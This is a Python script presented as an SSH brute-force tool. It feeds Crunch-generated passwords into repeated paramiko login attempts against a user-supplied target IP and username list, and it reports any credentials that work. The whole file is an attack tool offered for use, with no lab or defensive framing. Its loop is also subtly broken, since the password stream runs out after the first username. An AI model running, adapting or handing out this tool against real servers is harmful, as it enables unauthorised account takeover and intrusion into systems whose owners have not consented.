import subprocess
import paramiko
import sys

# Banner
def print_banner():
    print("""
    ============================================
    |        SSH Brute-Force Tool              |
    |    Usernames and Passwords Pipeline      |
    |   Powered by Python + Crunch             |
    ============================================
    """)

# SSH Brute Force Function
def ssh_brute_force(target_ip, username_list, crunch_command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Start Crunch process to generate passwords
    try:
        crunch_process = subprocess.Popen(crunch_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        print(f"[+] Crunch started with command: {' '.join(crunch_command)}")
    except FileNotFoundError:
        print("[-] Crunch is not installed or not found in PATH.")
        sys.exit(1)

    # Brute force loop
    for username in username_list:
        username = username.strip()
        for password in crunch_process.stdout:
            password = password.strip()  # Remove newline characters
            try:
                print(f"[+] Trying {username}:{password}")
                ssh.connect(target_ip, username=username, password=password, timeout=3)
                print(f"[!] SUCCESS! Username: {username} | Password: {password}")
                ssh.close()
                return  # Stop on success
            except paramiko.AuthenticationException:
                continue  # Authentication failed, try next password
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    print("[-] Brute force failed. No valid username/password combination found.")

# Main Function
def main():
    print_banner()

    # Get user input
    target_ip = input("[?] Enter target IP address: ").strip()
    username_file = input("[?] Enter path to username list file: ").strip()
    crunch_min = input("[?] Enter minimum password length: ").strip()
    crunch_max = input("[?] Enter maximum password length: ").strip()
    crunch_charset = input("[?] Enter character set for Crunch (e.g., abc123): ").strip()

    # Load username list
    try:
        with open(username_file, 'r') as file:
            username_list = file.readlines()
    except FileNotFoundError:
        print(f"[-] File not found: {username_file}")
        sys.exit(1)

    # Generate Crunch command
    crunch_command = ["crunch", crunch_min, crunch_max, crunch_charset]
    
    # Start brute force
    ssh_brute_force(target_ip, username_list, crunch_command)

# Check for script execution
if __name__ == "__main__":
    main()
                             
